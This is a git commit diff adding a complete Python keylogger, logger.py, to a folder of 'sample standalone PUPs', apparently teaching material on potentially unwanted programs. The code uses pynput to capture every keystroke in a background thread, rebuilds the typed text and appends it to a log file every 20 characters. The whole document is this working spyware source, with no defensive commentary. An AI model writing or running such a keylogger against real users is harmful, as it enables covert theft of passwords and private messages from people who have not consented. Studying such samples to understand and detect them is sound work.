483b310e4ce5a2468cf33dce3a5e3bc42172e442
Wolf <104569969+0x00wolf@users.noreply.github.com>
2024-01-10 22:59:25 -0400

    Update logger.py

--- part_3/sample_standalone_PUPs/logger.py
+++ part_3/sample_standalone_PUPs/logger.py
@@ -1,1 +1,47 @@
+# A threaded keylogger in Python that writes keystrokes to file every 20th keystroke.
+import queue
+import threading
+from pynput import keyboard
 
+
+def worker():
+    key_string = ''
+    while True:
+        key = q.get()
+        try:
+            key_string += str(key.char)
+        except AttributeError:
+            if key == key.space:
+                key_string += ' '
+            elif key == key.backspace:
+                key_string = key_string[:-1]
+            elif key == key.shift:
+                pass
+            elif key == key.enter:
+                key_string += '\\n'
+            elif key == key.alt:
+                pass
+            elif key == key.tab:
+                pass
+            elif key == key.ctrl:
+                pass
+            else:
+                key_string += str(key)
+
+        if len(key_string) >= 20:
+            with open('logfile.txt', 'a') as f:
+                f.write(key_string)
+            key_string = ''
+
+        q.task_done()
+
+
+def on_press(key):
+    q.put(key)
+
+
+q = queue.Queue()
+t = threading.Thread(target=worker)
+t.start()
+listener = keyboard.Listener(on_press=on_press)
+listener.start()
